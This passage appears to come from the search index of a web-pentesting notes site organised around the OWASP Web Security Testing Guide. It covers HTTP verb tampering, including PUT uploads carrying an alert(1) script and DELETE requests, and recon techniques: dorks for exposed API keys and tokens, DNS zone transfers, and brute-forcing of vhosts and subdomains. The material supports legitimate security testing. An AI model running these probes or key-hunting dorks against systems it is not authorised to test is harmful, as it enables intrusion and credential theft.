Enumerate supported HTTP methods using OPTIONS. - Test for access control bypass (GET-&gt;HEAD-&gt;FOO). - Test HTTP method overriding techniques. <p>HTTP method tampering, also known as HTTP verb tampering, is a type of security vulnerability that can be exploited in web applications. HTTP method tampering occurs when an attacker modifies the HTTP method being used in a request to trick the web application into performing unintended actions.</p> <p>More about HTTP methods.</p> <p></p>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#test-objectives","title":"Test Objectives","text":"<ul> <li>Enumerate supported HTTP methods.</li> <li>Test for access control bypass.</li> <li>Test HTTP method overriding techniques.</li> </ul> <p>Enumerate with OPTIONS:</p> <pre><code>curl -v -X OPTIONS &lt;target&gt;\n</code></pre> <p>Test access control bypass with a made-up method:</p> <pre><code>curl -v -X FAKEMETHOD &lt;target&gt;\n</code></pre> <p>Or test access control bypass with other methods.</p>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#put","title":"PUT","text":"<p>After enumerating methods with Burpsuite:</p> <pre><code>OPTIONS /uploads HTTP/1.1\nHost: example.org\n</code></pre> <p>We obtained as response:</p> <pre><code>HTTP/1.1 200 OK\nDate: ....\n....\nAllow: OPTIONS,GET,HEAD,POST,PUT,DELETE,TRACE,PROPPATCH,COPY,MOVE,LOCK\n</code></pre> <p>Then, we can try to upload a file by using Burpsuite. Typical payload:</p> <pre><code>PUT /test.html HTTP/1.1\nHost: example.org\nContent-Length: 25\n\n&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>Try to upload a file by using curl. Typical payload:</p> <pre><code>curl https://example.org --upload-file test.html\ncurl -X PUT https://example.org/test.html -d \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#delete","title":"DELETE","text":"<p>Try to delete a file by using Burpsuite. Typical payload:</p> <pre><code>DELETE /uploads/file1.pdf HTTP/1.1\nHost: example.org\n</code></pre> <p>Try to delete a file by using curl. Typical payload:</p> <pre><code>curl -X DELETE https://example.org/uploads/file1.pdf\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#trace","title":"TRACE","text":"<p>The\u00a0<code>TRACE</code>\u00a0method (or Microsoft\u2019s equivalent\u00a0<code>TRACK</code>\u00a0method) causes the server to echo back the contents of the request. This led to a vulnerability called Cross-Site Tracing (XST), which could be used to access cookies that had the\u00a0<code>HttpOnly</code>\u00a0flag set. The\u00a0<code>TRACE</code>\u00a0method has been blocked in all browsers and plugins for many years; as such, this issue is no longer exploitable. However, it may still be flagged by automated scanning tools, and the\u00a0<code>TRACE</code>\u00a0method being enabled on a web server suggests that is has not been properly hardened.</p>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#connect","title":"CONNECT","text":"<p>The\u00a0<code>CONNECT</code>\u00a0method causes the web server to open a TCP connection to another system, and then pass traffic from the client to that system. This could allow an attacker to proxy traffic through the server, in order to hide their source address, access internal systems or access services that are bound to localhost. An example of a\u00a0<code>CONNECT</code>\u00a0request is shown below:</p> <pre><code>CONNECT 192.168.0.1:443 HTTP/1.1\nHost: example.org\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#testing-for-access-control-bypass","title":"Testing for Access Control Bypass","text":"<p>If a page on the application redirects users to a login page with a 302 code when they attempt to access it directly, it may be possible to bypass this by making a request with a different HTTP method, such as\u00a0<code>HEAD</code>,\u00a0<code>POST</code>\u00a0or even a made up method such as\u00a0<code>FOO</code>. If the web application responds with a\u00a0<code>HTTP/1.1 200 OK</code>\u00a0rather than the expected\u00a0<code>HTTP/1.1 302 Found</code>, it may then be possible to bypass the authentication or authorization.</p> <pre><code>HEAD /admin/ HTTP/1.1\nHost: example.org\n</code></pre> <pre><code>HTTP/1.1 200 OK\n[...]\nSet-Cookie: adminSessionCookie=[...];\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-06/#testing-for-http-method-overriding","title":"Testing for HTTP Method Overriding","text":"<p>Some web frameworks provide a way to override the actual HTTP method in the request. They achieve this by emulating the missing HTTP verbs and passing some custom headers in the requests. For example:</p> <ul> <li><code>X-HTTP-Method</code></li> <li><code>X-HTTP-Method-Override</code></li> <li><code>X-Method-Override</code></li> </ul> <p>To test this, consider scenarios where restricted verbs like\u00a0<code>PUT</code>\u00a0or\u00a0<code>DELETE</code>\u00a0return a\u00a0<code>405 Method not allowed</code>. In such cases, replay the same request, but add the alternative headers for HTTP method overriding.</p>","tags":["web pentesting","reconnaissance","WSTG-CONF-06"]},{"location":"OWASP/WSTG-CONF-07/","title":"Test HTTP Strict Transport Security","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.7. Test HTTP Strict Transport Security</p> ID Link to Hackinglife Link to OWASP Description 2.7 WSTG-CONF-07 Test HTTP Strict Transport Security - Review the HSTS header and its validity. - Identify HSTS header on Web server through HTTP response header: curl -s -D- https://domain.com/ |","tags":["web pentesting","reconnaissance","WSTG-CONF-07"]},{"location":"OWASP/WSTG-CONF-08/","title":"Test RIA Cross Domain Policy","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.8. Test RIA Cross Domain Policy</p> ID Link to Hackinglife Link to OWASP Description 2.8 WSTG-CONF-08 Test RIA Cross Domain Policy Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.","tags":["web pentesting","reconnaissance","WSTG-CONF-08"]},{"location":"OWASP/WSTG-CONF-09/","title":"Test File Permission","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.9. Test File Permission</p> ID Link to Hackinglife Link to OWASP Description 2.9 WSTG-CONF-09 Test File Permission - Review and Identify any rogue file permissions. - Identify configuration file whose permissions are set to world-readable from the installation by default.","tags":["web pentesting","reconnaissance","WSTG-CONF-09"]},{"location":"OWASP/WSTG-CONF-10/","title":"Test for Subdomain Takeover","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.10. Test for Subdomain Takeover</p> ID Link to Hackinglife Link to OWASP Description 2.10 WSTG-CONF-10 Test for Subdomain Takeover - Enumerate all possible domains (previous and current). - Identify forgotten or misconfigured domains.","tags":["web pentesting","reconnaissance","WSTG-CONF-10"]},{"location":"OWASP/WSTG-CONF-11/","title":"Test Cloud Storage","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.11. Test Cloud Storage</p> ID Link to Hackinglife Link to OWASP Description 2.11 WSTG-CONF-11 Test Cloud Storage - Assess that the access control configuration for the storage services is properly in place.","tags":["web pentesting","reconnaissance","WSTG-CONF-11"]},{"location":"OWASP/WSTG-CONF-12/","title":"Testing for Content Security Policy","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.12. Testing for Content Security Policy</p> ID Link to Hackinglife Link to OWASP Description 2.12 WSTG-CONF-12 Testing for Content Security Policy - Review the Content-Security-Policy header or meta element to identify misconfigurations.","tags":["web pentesting","reconnaissance","WSTG-CONF-12"]},{"location":"OWASP/WSTG-CONF-13/","title":"Test Path Confusion","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.13. Test Path Confusion</p> ID Link to Hackinglife Link to OWASP Description 2.13 WSTG-CONF-13 Test Path Confusion - Make sure application paths are configured correctly.","tags":["web pentesting","reconnaissance","WSTG-CONF-13"]},{"location":"OWASP/WSTG-CRYP-01/","title":"Testing for Weak Transport Layer Security","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 9. Cryptography &gt; 9.1. Testing for Weak Transport Layer Security</p> ID Link to Hackinglife Link to OWASP Description 9.1 WSTG-CRYP-01 Testing for Weak Transport Layer Security - Validate the server configuration (Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)  - Review the digital certificate's cryptographic strength and validity.  - Ensure that the TLS security is not bypassable and is properly implemented across the application.","tags":["web pentesting","WSTG-CRYP-01"]},{"location":"OWASP/WSTG-CRYP-02/","title":"Testing for Padding Oracle","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 9. Cryptography &gt; 9.2. Testing for Padding Oracle</p> ID Link to Hackinglife Link to OWASP Description 9.2 WSTG-CRYP-02 Testing for Padding Oracle - Identify encrypted messages that rely on padding.  - Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.","tags":["web pentesting","WSTG-CRYP-02"]},{"location":"OWASP/WSTG-CRYP-03/","title":"Testing for Sensitive Information Sent via Unencrypted Channels","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 9. Cryptography &gt; 9.3. Testing for Sensitive Information Sent via Unencrypted Channels</p> ID Link to Hackinglife Link to OWASP Description 9.3 WSTG-CRYP-03 Testing for Sensitive Information Sent via Unencrypted Channels - Identify sensitive information transmitted through the various channels.  - Assess the privacy and security of the channels used.  - Check sensitive data during the transmission:  \u2022 Information used in authentication (e.g. Credentials, PINs, Session, identifiers, Tokens, Cookies\u2026), \u2022 Information protected by laws, regulations or specific organizational, policy (e.g. Credit Cards, Customers data)","tags":["web pentesting","WSTG-CRYP-03"]},{"location":"OWASP/WSTG-CRYP-04/","title":"Testing for Weak Encryption","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 9. Cryptography &gt; 9.4. Testing for Weak Encryption</p> ID Link to Hackinglife Link to OWASP Description 9.4 WSTG-CRYP-04 Testing for Weak Encryption - Provide a guideline for the identification weak encryption or hashing uses and implementations.","tags":["web pentesting","WSTG-CRYP-04"]},{"location":"OWASP/WSTG-ERRH-01/","title":"Testing for Improper Error Handling","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 8. Error Handling &gt; 8.2. Testing for Improper Error Handling</p> ID Link to Hackinglife Link to OWASP Description 8.1 WSTG-ERRH-01 Testing for Improper Error Handling - Identify existing error output (i.e.: Random files/folders (40x)  - Analyze the different output returned.","tags":["web pentesting","WSTG-ERRH-01"]},{"location":"OWASP/WSTG-ERRH-02/","title":"Testing for Stack Traces","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 8. Error Handling &gt; 8.2. Testing for Stack Traces</p> ID Link to Hackinglife Link to OWASP Description 8.2 WSTG-ERRH-02 Testing for Stack Traces N/A, This content has been merged into: WSTG-ERRH-01","tags":["web pentesting","WSTG-ERRH-02"]},{"location":"OWASP/WSTG-IDNT-01/","title":"Test Role Definitions","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 3. Identity Management Testing &gt; 3.1. Test Role Definitions</p> ID Link to Hackinglife Link to OWASP Description 3.1 WSTG-IDNT-01 Test Role Definitions - Identify and document roles used by the application.  - Attempt to switch, change, or access another role.  - Review the granularity of the roles and the needs behind the permissions given. <p>OWASP/WSTG-IDNT-01.md</p>","tags":["web pentesting","WSTG-IDNT-01"]},{"location":"OWASP/WSTG-IDNT-02/","title":"Test User Registration Process","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 3. Identity Management Testing &gt; 3.2. Test User Registration Process</p> ID Link to Hackinglife Link to OWASP Description 3.2 WSTG-IDNT-02 Test User Registration Process - Verify that the identity requirements for user registration are aligned with business and security requirements.  - Validate the registration process.","tags":["web pentesting","WSTG-IDNT-02"]},{"location":"OWASP/WSTG-IDNT-03/","title":"Test Account Provisioning Process","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 3. Identity Management Testing &gt; 3.3. Test Account Provisioning Process</p> ID Link to Hackinglife Link to OWASP Description 3.3 WSTG-IDNT-03 Test Account Provisioning Process - Verify which accounts may provision other accounts and of what type.","tags":["web pentesting","WSTG-IDNT-03"]},{"location":"OWASP/WSTG-IDNT-04/","title":"Testing for Account Enumeration and Guessable User Account","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 3. Identity Management Testing &gt; 3.4. Testing for Account Enumeration and Guessable User Account</p> ID Link to Hackinglife Link to OWASP Description 3.4 WSTG-IDNT-04 Testing for Account Enumeration and Guessable User Account - Review processes that pertain to user identification (e.g. registration, login, etc.).  - Enumerate users where possible through response analysis.","tags":["web pentesting","WSTG-IDNT-04"]},{"location":"OWASP/WSTG-IDNT-05/","title":"Testing for Weak or Unenforced Username Policy","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 3. Identity Management Testing &gt;  3.5 Testing for Weak or Unenforced Username Policy</p> ID Link to Hackinglife Link to OWASP Description 3.5 WSTG-IDNT-05 Testing for Weak or Unenforced Username Policy - Determine whether a consistent account name structure renders the application vulnerable to account enumeration.  - User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.  - Determine whether the application's error messages permit account enumeration.","tags":["web pentesting","WSTG-IDNT-05"]},{"location":"OWASP/WSTG-INFO-01/","title":"Conduct search engine discovery reconnaissance for information leakage","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.1. Conduct search engine discovery reconnaissance for information leakage</p> ID Link to Hackinglife Link to OWASP Objectives 1.1 WSTG-INFO-01 Conduct Search Engine Discovery Reconnaissance for Information Leakage - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services). <p>This is merely passive reconnaissance.</p>","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-01/#use-multiple-search-engines","title":"Use multiple search engines","text":"<ul> <li>Baidu</li> <li>Bing</li> <li>binsearch.info</li> <li>Common crawl</li> <li>Duckduckgo</li> <li>Wayback machine</li> <li>Startpage (based on google but trackers and logs)</li> <li>Shodan.</li> </ul>","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-01/#use-operators","title":"Use operators","text":"","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-01/#google-dorks","title":"Google Dorks","text":"<p>More about google dorks.</p> Google Dorking Query Expected results intitle:\"api\" site: \"example.com\" Finds all publicly available API related content in a given hostname. Another cool example for API versions:  inurl:\"/api/v1\" site: \"example.com\" intitle:\"json\" site: \"example.com\" Many APIs use json, so this might be a cool filter inurl:\"/wp-son/wp/v2/users\" Finds all publicly available WordPress API user directories. intitle:\"index.of\" intext:\"api.txt\" Finds publicly available API key files. inurl:\"/api/v1\" intext:\"index of /\" Finds potentially interesting API directories. intitle:\"index of\" api_key OR \"api key\" OR apiKey -pool This is one of my favorite queries. It lists potentially exposed API keys. <p>Use cache operator</p> <pre><code>cache:target.com\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-01/#github","title":"Github","text":"<p>More Githun Dorking.</p> Github Dowking Query Expected results applicationName api key After getting results, filter by issue and you may find some api keys. It's common to leave api keys exposed when rebasing a git repo, for instance api_key - authorization_bearer - oauth - auth - authentication - client_secret - api_token - client_id - OTP - HOMEBREW_GITHUB_API_TOKEN - SF_USERNAME - HEROKU_API_KEY - JEKYLL_GITHUB_TOKEN - api.forecast.io - password - user_password - user_pass - passcode - client_secret - secret - password hash - user auth - extension: json nasa Results show some extensions that include json, so they might be API related shodan_api_key Results show shodan api keys \"authorization: Bearer\" This search reveal some authorization token. filename: swagger.json Go to Code tab and you will have the swagger file.","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-01/#shodan","title":"Shodan","text":"<p>Go to shodan.</p> Shodan Dowking Query Expected results \"content-type: application/json\" This type of content is usually related to APIs \"wp-json\" If you are using wordpress","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-01/#waybackmachine-with-waybackurls","title":"WaybackMachine with WayBackUrls","text":"<p>waybackurls inspects back URLs saved by Wayback Machine  and look for specific keywords.  Installation:</p> <pre><code>go install github.com/tomnomnom/waybackurls@latest\n</code></pre> <p>Basic usage:</p> <pre><code>waybackurls -dates https://example.com &gt; waybackurls.txt\n\ncat waybackurls.txt\n</code></pre> <p>Dork for API endpoints discovery:</p> Waybackmachine Dowking Query Expected results Path to a API We are trying to see is there is a recorded history of the API. It may provide us with endpoints that used to exist but allegedly not anymore.","tags":["web pentesting","reconnaissance","WSTG-INFO-01","dorkings"]},{"location":"OWASP/WSTG-INFO-02/","title":"Fingerprint Web Server","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.2. Fingerprint Web Server</p> ID Link to Hackinglife Link to OWASP Objectives 1.2 WSTG-INFO-02 Fingerprint Web Server - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-02/#passive-fingerprinting","title":"Passive fingerprinting","text":"","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-02/#whois","title":"Whois","text":"<pre><code> whois $TARGET\n</code></pre> <pre><code>whois.exe &lt;TARGET&gt;\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-02/#banner-grabbing","title":"Banner grabbing","text":"<p>Basic:</p> <pre><code>curl -I &lt;domain.com&gt;\n</code></pre> <ul> <li>nmap.      <pre><code># Grab banner of services in an IP\nnmap -sV --script=banner $ip\n\n# Grab banners of services in a range\nnmap -sV --script=banner $ip/24\n</code></pre></li> <li>telnet</li> <li>openssl <pre><code>openssl s_client -connect target.site:443\nHEAD / HTTP/1.0\n</code></pre></li> <li> <ul> <li>sending malformed request (with SANTACLAUS method for instance):     <pre><code>GET / SANTACLAUS/1.1\n</code></pre></li> </ul> </li> <li> <p>Some targets obfuscate their servers by modifying headers, but, there is a default ordering in the headers response, so you can do some guessing from ordering too.</p> </li> </ul>","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-02/#automatic-scanning-tools","title":"Automatic scanning tools","text":"<p>netcraft, nikto.</p> <p>Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view. We can use the service by visiting <code>https://sitereport.netcraft.com</code> and entering the target domain. We need to pay special attention to the latest IPs used. Sometimes we can spot the actual IP address from the webserver before it was placed behind a load balancer, web application firewall, or IDS, allowing us to connect directly to it if the configuration.</p>","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-02/#active-fingerprinting","title":"Active fingerprinting","text":"","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-02/#http-headers-and-html-source-code","title":"HTTP headers and HTML Source code","text":"<ul> <li>Note the response header  <code>Server</code>, <code>X-Powered-By</code>, or <code>X-Generator</code> as well.</li> <li>Identify framework specific cookies. For instance, the cookie <code>CAKEPHP</code> for php.</li> <li>Review the source code and identify <code>&lt;meta&gt;</code> or attributes with typical patterns from some servers (and/or frameworks).</li> </ul> <pre><code>nmap -sV -F target\n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-INFO-02","dorkings"]},{"location":"OWASP/WSTG-INFO-03/","title":"Review Webserver Metafiles for Information Leakage","text":"<p>OWASP</p> <p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.3. Review Webserver Metafiles for Information Leakage</p> ID Link to Hackinglife Link to OWASP Objectives 1.3 WSTG-INFO-03 Review Webserver Metafiles for Information Leakage - Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, <code>&lt;META&gt;</code> tag, sitemap.xml) - Extract and map other information that could lead to a better understanding of the systems at hand.","tags":["web","pentesting","reconnaissance","WSTG-INFO-03"]},{"location":"OWASP/WSTG-INFO-03/#searching-for-well-known-files","title":"Searching for well-known files","text":"<ul> <li>robots.txt</li> <li>sitemap.xml</li> <li>security.txt (proposed standard which allows websites to define security policies and contact details.)</li> <li>human.txt (initiative for knowing the people behind a website.)</li> </ul>","tags":["web","pentesting","reconnaissance","WSTG-INFO-03"]},{"location":"OWASP/WSTG-INFO-03/#examining-meta-tags","title":"Examining META tags","text":"<p><code>&lt;META&gt;</code> tags are located within the <code>HEAD</code>section of each HTML document. </p> <p>Robots directive can also be specified through the use of a specific <code>META</code>tag.</p> <pre><code>&lt;META NAME=\"ROBOTS\" ...&gt;\n</code></pre> <p>If no <code>META</code> tag is present, then the default is <code>INDEX, FOLLOW</code>. </p> <p>Other revealing <code>META</code> tags. </p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-03"]},{"location":"OWASP/WSTG-INFO-03/#the-well-known-directory","title":"The .well-known/ directory","text":"<p>The\u00a0<code>.well-known</code>\u00a0standard, defined in\u00a0RFC 8615, serves as a standardized directory within a website's root domain. This designated location, typically accessible via the\u00a0<code>/.well-known/</code>\u00a0path on a web server, centralizes a website's critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p> <p>Some of the files are these: https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml.</p> URI Suffix Description Status Reference <code>security.txt</code> Contains contact information for security researchers to report vulnerabilities. Permanent RFC 9116 <code>/.well-known/change-password</code> Provides a standard URL for directing users to a password change page. Provisional https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uri <code>openid-configuration</code> Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Permanent http://openid.net/specs/openid-connect-discovery-1_0.html <code>assetlinks.json</code> Used for verifying ownership of digital assets (e.g., apps) associated with a domain. Permanent https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md <code>mta-sts.txt</code> Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security. Permanent RFC 8461","tags":["web","pentesting","reconnaissance","WSTG-INFO-03"]},{"location":"OWASP/WSTG-INFO-04/","title":"Enumerate Applications on Webserver","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.4. Enumerate Applications on Webserver</p> ID Link to Hackinglife Link to OWASP Objectives 1.4 WSTG-INFO-04 Enumerate Applications on Webserver - Enumerate the applications within the scope that exist on a web server.  - Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers <p>Web application discovery is a process aimed at identifying web applications on a given infrastructure:</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#1-different-based-url","title":"1. Different based URL","text":"<p>https://example.com/application1  and https://example.com/application2</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#google-dork","title":"google dork","text":"<p>If these applications are indexed, try this google dork:</p> <pre><code>site:example.com\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#gobuster","title":"gobuster","text":"<p>gobuster Cheat sheet.</p> <p>Brute force directory discovery but it's not recursive (you need to specify a directory to perform a deeper scanner). </p> <pre><code>gobuster dir -u &lt;exact target url&gt; -w &lt;/path/dic.txt&gt; --wildcard -b 401\n# -b flag is to exclude from results an specific http response\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#more-tools","title":"More tools","text":"Tool + Cheat sheet URL dirb DIRB is a web content fingerprinting tool. It scans the web server for directories using a dictionary file feroxbuster FEROXBUSTER is a web content fingerprintinf tool that uses brute force combined with a wordlist to search for unlinked content in target directories. httprint HTTPRINT is a web server fingerprinting tool. It identifies web servers and detects web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. wpscan WPSCAN is a wordpress security scanner.","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#2-non-standard-ports","title":"2. Non standard ports","text":"<p>https://example.com:1234/  and https://example.com:8088/</p> <pre><code>nmap -Pn -sT -p0-65535 $ip\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#3-virtual-hosts","title":"3. Virtual hosts","text":"<p>https://example.com/  and https://webmail.example.com/</p> <p>A virtual host (<code>vHost</code>) is a feature that allows several websites to be hosted on a single server. </p> <p>There are two ways to configure virtual hosts:</p> <ul> <li><code>IP</code>-based virtual hosting</li> <li><code>Name</code>-based virtual hosting: The distinction for which domain the service was requested is made at the application level. For example, several domain names, such as <code>admin.inlanefreight.htb</code> and <code>backup.inlanefreight.htb</code>, can refer to the same IP. Internally on the server, these are separated and distinguished using different folders. </li> </ul>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#identify-name-server","title":"Identify name server","text":"<pre><code>host -t ns example.com\n</code></pre> <p>Request a zone transfer for example.com from one of its nameservers:</p> <pre><code>host -l example.com ns1.example.com\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#dns-enumeration","title":"DNS enumeration","text":"<p>More about DNS enumeration.</p> <p>gobuster (More complete cheat sheet: gobuster)</p> <pre><code>gobuster dns -d &lt;DOMAIN (without http)&gt; -w /usr/share/SecLists/Discovery/DNS/namelist.txt\n</code></pre> <p>Bash script, using Sec wordlist:</p> <pre><code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.example.com @$ip | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n</code></pre> <p>dig (More complete cheat sheet: dig)</p> <pre><code># Get email of administrator of the domain\ndig soa www.example.com\n# The email will contain a (.) dot notation instead of @\n\n# ENUMERATION\n# List nameservers known for that domain\ndig ns example.com @$ip\n# -ns: other name servers are known in NS record\n#  `@` character specifies the DNS server we want to query.\n\n# View all available records\ndig any example.com @$ip\n\n# Display version. query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server.\ndig CH TXT version.bind $ip\n</code></pre> <p>nslookup (More complete cheat sheet: nslookup)</p> <pre><code># Query `A` records by submitting a domain name: default behaviour\nnslookup $TARGET\n\n# We can use the `-query` parameter to search specific resource records\n# Querying: A Records for a Subdomain\nnslookup -query=A $TARGET\n\n# Querying: PTR Records for an IP Address\nnslookup -query=PTR 31.13.92.36\n\n# Querying: ANY Existing Records\nnslookup -query=ANY $TARGET\n\n# Querying: TXT Records\nnslookup -query=TXT $TARGET\n\n# Querying: MX Records\nnslookup -query=MX $TARGET\n\n#  Specify a nameserver if needed by adding `@&lt;nameserver/IP&gt;` to the command\n</code></pre> <p>DNScan (More complete cheat sheet: DNScan): Python wordlist-based DNS subdomain scanner. The script will first try to perform a zone transfer using each of the target domain's nameservers.</p> <pre><code>dnscan.py (-d \\&lt;domain\\&gt; | -l \\&lt;list\\&gt;) [OPTIONS]\n# Mandatory Arguments\n#    -d  --domain                              Target domain; OR\n#    -l  --list                                Newline separated file of domains to scan\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-04/#vhost-enumeration","title":"VHOST enumeration","text":"<p>vHost Fuzzing</p> <pre><code># use a vhost dictionary file\ncp /usr/share/wordlists/secLists/Discovery/DNS/namelist.txt ./vhosts\n\ncat ./vhosts | while read vhost;do echo \"\\n********\\nFUZZING: ${vhost}\\n********\";curl -s -I http://$ip -H \"HOST: ${vhost}.example.com\" | grep \"Content-Length: \";done\n</code></pre> <p>vHost Fuzzing with ffuf:</p> <pre><code># Virtual Host enumeration\n# use a vhost dictionary file\ncp /usr/share/wordlists/secLists/Discovery/DNS/namelist.txt ./vhosts\n\nffuf -w ./vhosts -u http://$ip -H \"HOST: FUZZ.example.com\" -fs 612\n# `-w`: Path to our wordlist\n# `-u`: URL we want to fuzz\n# `-H \"HOST: FUZZ.randomtarget.com\"`: This is the `HOST` Header, and the word `FUZZ` will be used as the fuzzing point.\n# `-fs 612`: Filter responses with a size of 612, default response size in this case.\n</code></pre> <p>gobuster (More complete cheat sheet: gobuster)</p> <pre><code>gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &lt;exact target url&gt;\n# vhost : Uses VHOST for brute-forcing\n# -w : Path to the wordlist\n# -u : Specify the URL\n</code></pre> <p>Wfuzz (More complete cheat sheet: Wfuzz:</p> <pre><code>wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H \"Host: FUZZ.nunchucks.htb\" --hl 546\n# -c: Color in output\n# \u2013hc 404: Hide 404 code responses\n# -t 200: Concurrent Threads\n# -u http://nunchucks.htb/: Target URL\n# -w /usr/share/dirb/wordlists/common.txt: Wordlist \n# -H \u201cHost: FUZZ.nunchucks.htb\u201d: Header. Also with \"FUZZ\" we indicate the injection point for payloads\n# \u2013hl 546: Filter out responses with a specific number of lines. In this case, 546\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-04"]},{"location":"OWASP/WSTG-INFO-05/","title":"Review Webpage content for Information Leakage","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.5. Review Webpage content for Information Leakage</p> ID Link to Hackinglife Link to OWASP Objectives 1.5 WSTG-INFO-05 Review Webpage Content for Information Leakage - Review webpage comments, metadata, and redirect bodies to find any information leakage.  - Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.  - Identify if source map files or other front-end debug files exist. <p>Sensitive information can include (but not limited to): Private API keys, internal 